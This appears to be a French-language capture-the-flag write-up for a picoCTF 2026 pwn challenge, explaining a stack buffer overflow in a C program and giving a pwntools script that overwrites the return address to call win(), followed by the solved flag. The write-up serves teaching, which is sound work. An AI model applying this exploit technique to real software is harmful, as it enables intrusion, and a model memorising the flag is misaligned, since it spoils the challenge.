---
# Imported from Obsidian: CTF/picoCTF/picoCTF_2026/Echo Espace 2.md
title: Echo Espace 2
category: Pwn
ctf: picoCTF 2026
date: 2026-08-07
summary: 1. Remplir le buffer de 32 octets avec des déchets (padding).
tags:
- bufer-overflow
- picoctf-2026
- pwn
lang: fr
imported: true
---

### Catégorie : pwn 

Source : 
```
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

  

void win() {

    FILE *fp = fopen("flag.txt", "r");

    if (!fp) {

        perror("[!] Could not open flag.txt");

        exit(1);

    }

  

    char flag[128];

    fgets(flag, sizeof(flag), fp);

    printf("Flag: %s\n", flag);

    fflush(stdout);

    fclose(fp);

}

  

void vuln() {

    char buf[32];  

  

    printf("Enter the secret key: ");

    fflush(stdout);

  

    fgets(buf, 128, stdin);

  

    printf("You entered:, %s\n", buf);

}

  

int main() {

    vuln();

    puts("Goodbye!");

    return 0;

}
```

### L'analyse de la vulnérabilité

Dans la fonction `vuln()`, tu as ceci :

- Un buffer `buf` de **32 octets**.
    
- Un `fgets(buf, 128, stdin)`.
    

**Le problème :** On demande à `fgets` de lire jusqu'à **128 octets** dans un espace qui n'en contient que **32**. On peut donc écraser ce qu'il y a sur la pile (stack) après le buffer, notamment l'adresse de retour de la fonction.

### 2. La stratégie d'exploitation

Pour capturer le flag, nous devons :

1. Remplir le buffer de 32 octets avec des déchets (padding).
    
2. Écraser le **Saved RBP** (généralement 4 ou 8 octets selon l'architecture).
    
3. Écraser l'**adresse de retour** (Return Address) par l'adresse de la fonction `win()`
### Payload d'automatisation avec pwntools 

```
from pwn import *

# On définit le binaire pour que pwntools sache qu'on est en i386
exe = './vuln'
elf = context.binary = ELF(exe)
context.log_level = 'debug' # Pour voir exactement ce qui est envoyé/reçu

def solve(io):
    # On envoie une chaîne cyclique pour trouver l'offset du crash
    # Si tu connais déjà l'offset, remplace par: padding = b"A" * OFFSET
    padding = b"A" * 44 # Teste 44 si 36 n'a pas marché
    
    # On ajoute l'adresse de win
    payload = padding + p32(elf.symbols['win'])
    
    io.sendline(payload)
    # On affiche tout ce que le serveur renvoie (le flag)
    print(io.recvall())

# Tente d'abord en local pour ajuster l'offset si besoin
# io = process(exe)

# Puis en distant
io = remote("dolphin-cove.picoctf.net", 60732)
solve(io)
```
### Flag : 
```
picoCTF{fgets_0v3rfl0w42_79ccc1c5}

```
